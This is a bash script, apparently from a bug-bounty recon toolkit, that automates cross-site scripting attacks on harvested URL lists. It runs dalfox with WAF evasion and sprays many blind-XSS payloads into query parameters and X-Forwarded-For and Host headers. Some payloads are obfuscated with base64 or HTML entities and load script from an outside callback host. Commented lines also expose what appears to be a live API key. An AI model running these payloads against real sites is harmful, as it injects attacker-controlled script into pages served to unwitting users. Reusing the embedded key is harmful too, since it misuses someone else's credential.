#!/bin/bash
RED='\033[0;31m';
GREEN='\033[0;32m';
YELLOW='\033[1;33m';
BLUE='\033[0;34m';
NC='\033[0m';
PURPLE='\033[01;35m';
CYAN='\033[01;36m';
WHITE='\033[01;37m';
BOLD='\033[1m';
UNDERLINE='\033[4m';

#echo -e "${YELLOW}
#                                                                                                     
#
#   _  ____________       _   ______ _       __
#  | |/ / ___/ ___/      / | / / __ \ |     / /
#  |   /\__ \\__ \______/  |/ / / / / | /| / / 
# /   |___/ /__/ /_____/ /|  / /_/ /| |/ |/ /  
#/_/|_/____/____/     /_/ |_/\____/ |__/|__/   
#                                              
#
#${GREEN}@winteriscoming${NC}";

#while getopts ":u:" input;do
#        case "$input" in
#                u) urls=${OPTARG}
#                        ;;
#                esac
#        done
#if [ -z "$urls" ]
#        then
#                echo "Please give a file like \"-u urls.txt\""
#                exit 1
#fi
echo -ne "${RED}${BOLD}Dalfox Multicast Mode: ";
cat reconitall/gf/xss.txt | dalfox pipe --multicast --waf-evasion -S --silence-force | anew reconitall/xss/dalfox.txt 1>/dev/null;
echo -e "${YELLOW}Done${NC}"

echo "";
echo -ne "${RED}${BOLD}Dalfox Pipe Blind Mode: ";
cat reconitall/alive-params.txt | dalfox pipe -b 'https://wintericoming.bxss.in' -S --silence-force | anew reconitall/xss/dalfox-blind.txt 1>/dev/null;
echo -e "${YELLOW}Done${NC}"

echo -ne "${RED}${BOLD}Scannig for Blind XSS: ";
cat reconitall/alive-params.txt | qsreplaceBetter '"><script+src=https://wintericoming.bxss.in></script>' | rush -j40 "curl -sk '{}' 1>/dev/null"
cat reconitall/alive-params.txt | qsreplaceBetter '"><input%20onfocus=eval(atob(this.id))%20id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vd2ludGVyaWNvbWluZy5ieHNzLmluIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;autofocus>' | rush -j40 "curl -sk '{}' 1>/dev/null"
cat reconitall/alive-params.txt | qsreplaceBetter '><img/src=x+id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vd2ludGVyaWNvbWluZy5ieHNzLmluIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61%20onerror=eval(atob(this.id))>' | rush -j40 "curl -sk '{}' 1>/dev/null"
cat reconitall/alive-params.txt | qsreplaceBetter '<script>$.getScript(\"//wintericoming.bxss.in\")</script>' | rush -j40 "curl -sk '{}' 1>/dev/null"
cat reconitall/alive-params.txt | qsreplaceBetter '"><iframe+srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;wintericoming.bxss.in&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">' | rush -j40 "curl -sk '{}' 1>/dev/null"
cat reconitall/alive-params.txt | qsreplaceBetter '"><video><source%20onerror=eval(atob(this.id))%20id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vd2ludGVyaWNvbWluZy5ieHNzLmluIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw\&#61;\&#61;>' | rush -j40 "curl -sk '{}' 1>/dev/null"
######################################################################################################
######################################################################################################
cat reconitall/alive-params.txt | bxss -payload '"><script%20src=https://wintericoming.bxss.in></script>' -header "X-Forwarded-For" 1>/dev/null
cat reconitall/uro.txt | bxss -payload '"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vd2ludGVyaWNvbWluZy5ieHNzLmluIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; autofocus>' -header "X-Forwarded-For" 1>/dev/null
cat reconitall/uro.txt | bxss -payload '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vd2ludGVyaWNvbWluZy5ieHNzLmluIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61 onerror=eval(atob(this.id))>' -header "X-Forwarded-For" 1>/dev/null
cat reconitall/uro.txt | bxss -payload '"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;wintericoming.bxss.in&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">' -header "X-Forwarded-For" 1>/dev/null
cat reconitall/uro.txt | bxss -payload '<script>$.getScript("//wintericoming.bxss.in")</script>' -header "X-Forwarded-For" 1>/dev/null
cat reconitall/uro.txt | bxss -payload '"><script src=https://wintericoming.bxss.in></script>' -appendMode -header "Host" 1>/dev/null
cat reconitall/uro.txt | bxss -payload '"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vd2ludGVyaWNvbWluZy5ieHNzLmluIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; autofocus>' -appendMode -header "Host" 1>/dev/null
cat reconitall/uro.txt | bxss -payload '"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vd2ludGVyaWNvbWluZy5ieHNzLmluIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; autofocus>' -appendMode -header "Host" 1>/dev/null
cat reconitall/uro.txt | bxss -payload '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vd2ludGVyaWNvbWluZy5ieHNzLmluIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61 onerror=eval(atob(this.id))>' -appendMode -header "Host" 1>/dev/null
cat reconitall/uro.txt | bxss -payload '"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;wintericoming.bxss.in&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">' -appendMode -header "Host" 1>/dev/null
cat reconitall/uro.txt | bxss -payload '<script>$.getScript("//wintericoming.bxss.in")</script>' -appendMode -header "Host" 1>/dev/null 2>/dev/null
cat reconitall/uro.txt | bxss -payload '<script>$.getScript("//wintericoming.bxss.in")</script>' -appendMode 1>/dev/null 2>/dev/null
cat reconitall/uro.txt | bxss -payload '"><script src=https://wintericoming.bxss.in></script>' -appendMode 1>/dev/null 2>/dev/null
cat reconitall/uro.txt | bxss -payload '"><script src=https://wintericoming.bxss.in></script>' -appendMode -parameters 1>/dev/null 2>/dev/null
echo -e "${YELLOW}Done${NC}";

echo -ne "${RED}${BOLD}Trying XSS OneLiners: ";
cat reconitall/xss/gxss.txt | qsreplaceBetter "</script><script>confirm(1)</script>" | while read host; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host ${RED}Vulnerable\n" || echo "$host ${GREEN}Not Vulnerable\n" | grep -v 'Not' | anew reconitall/xss/xss-oneliner.txt ;done;
cat reconitall/xss/gxss.txt | qsreplace -a | qsreplaceBetter '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not' | anew reconitall/xss/xss-oneliner1.txt;
cat reconitall/xss/gxss.txt | qsreplace -a | qsreplaceBetter '"><img src=x onerror=alert(1);>' | freq 2>/dev/null | grep -v 'freq' | grep -v '__' | egrep -v 'Not' | anew reconitall/xss/xss-oneliner1.txt;
cat reconitall/alive-urls.txt | while read host; do curl -G --silent --path-as-is --insecure "$host" -H 'User-Agent: Mozilla/5.0' --data-urlencode 'query=<Svg%20One%20OnLoad=alert(1)>' | grep '\<Svg%20One%20OnLoad=alert\(1\)\>' && echo 'Vulnerable' || echo 'Not Vulnerable' | anew reconitall/xss/xss-oneliner2.txt; done
cat reconitall/xss/gxss.txt | xargs -I@ python3 /opt/XSStrike/xsstrike.py -u @ --console-log-level VULN --skip | grep -v 3.1.5 | grep -E '.' | grep  -vE '\[' | anew reconitall/xss/xss-oneliner3.txt;
cat reconitall/gf/xss.txt | while read url; do curl -skL "$url" | grep 'type="hidden"' | grep -Eo 'name="[^\"]+"' | cut -d'"' -f2 | xargs -I@ sh -c 'if curl -skL $url/?@=testxss | grep -q "value=testxss"; then echo "reflection found from @ parameter" | anew reconitall/xss/hidden.txt; fi'; done
cat reconitall/js.txt | httpx --match-regex "addEventListener\((?:'|\")message(?:'|\")" -silent 2>/dev/null | anew reconitall/xss/domxss.txt 1>/dev/null; 
cat reconitall/js.txt | httpx --match-regex "addEventListener\((?:'|\")message(?:'|\")" -silent 2>/dev/null | anew reconitall/xss/domxss.txt 1>/dev/null;
cat reconitall/js.txt | httpx --match-regex "addEventListener\((?:'|\")message(?:'|\")" -silent 2>/dev/null | anew reconitall/xss/domxss.txt 1>/dev/null;
echo -e "${YELLOW}Done${NC}";

echo -ne "${RED}${BOLD}Running Nuclei XSS Templates: "
cat reconitall/gf/xss.txt | nuclei -tags xss -silent 2>/dev/null | anew reconitall/xss/nuclei.xss 1>/dev/null;
echo -e "${YELLOW}Done${NC}";

#echo -ne "${RED}${BOLD}Scanning with Knoxss: ";
#cat reconitall/gf/xss.txt | awk '{ print "curl -s https://knoxss.me/api/v3 -d \"target="$1 "\" -H \"X-API-KEY: 629d06dd-791b-42ce-bd43-be4395b46e43\""}' | sh | grep "PoC" | anew reconitall/xss/knoxss.txt 1>/dev/null 2>/dev/null;
#cat reconitall/gf/xss.txt | while read host; do echo '$host&afb=1' | awk '{ print "curl -s https://knoxss.me/api/v3 -d \"target="$1 "\" -H \"X-API-KEY: 629d06dd-791b-42ce-bd43-be4395b46e43\""}' | sh | grep "PoC" | anew reconitall/xss/knoxss.txt 1>/dev/null 2>/dev/null; done;
#echo -e "${YELLOW}Done${NC}";
